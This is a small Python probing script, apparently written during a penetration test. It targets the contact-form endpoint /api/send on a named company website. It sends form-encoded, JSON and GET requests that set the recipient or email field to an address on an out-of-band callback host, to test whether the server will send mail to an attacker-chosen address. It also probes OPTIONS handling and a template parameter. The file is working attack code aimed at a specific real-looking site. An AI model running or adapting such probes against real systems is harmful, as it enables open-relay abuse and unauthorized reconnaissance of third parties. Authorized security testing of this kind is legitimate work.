import sys,time,json,requests
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
OOB="relay7f3a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
S=requests.Session(); S.headers.update({"User-Agent":UA,"Accept":"*/*"})
def go(p,m="GET",d=None,h=None):
    time.sleep(3)
    try: return S.request(m,B+p,data=d,headers=h,timeout=30,allow_redirects=False)
    except Exception as e: return e
def form(**kw):
    f={"fname":"vapt","lname":"probe","areacode":"+973","tel":"3600000","cname":"vapt","subject":"s","msg":"m","check":"1","targets":"0"}
    f.update(kw); return f
if __name__=="__main__":
    t=sys.argv[1]
    if t=="to_oob":
        r=go("/api/send","POST",form(to="probe@"+OOB),{"Referer":B+"/contact","Content-Type":"application/x-www-form-urlencoded"})
        print("to_oob:",r.status_code, r.content[:500])
    if t=="json":
        r=go("/api/send","POST",json.dumps({"fname":"vapt","lname":"p","email":"a@"+OOB,"msg":"m","to":"a@"+OOB}),{"Referer":B+"/contact","Content-Type":"application/json"})
        print("json:",r.status_code,r.content[:600])
    if t=="get":
        r=go("/api/send?to=a@"+OOB); print("get:",r.status_code,r.content[:400])
    if t=="opts":
        r=S.request("OPTIONS",B+"/api/send",timeout=20,headers={"User-Agent":UA}); print("opts:",r.status_code,dict(r.headers),r.content[:200])
    if t=="templates":
        r=go("/api/send?template=x"); print("tpl:",r.status_code,r.content[:300])
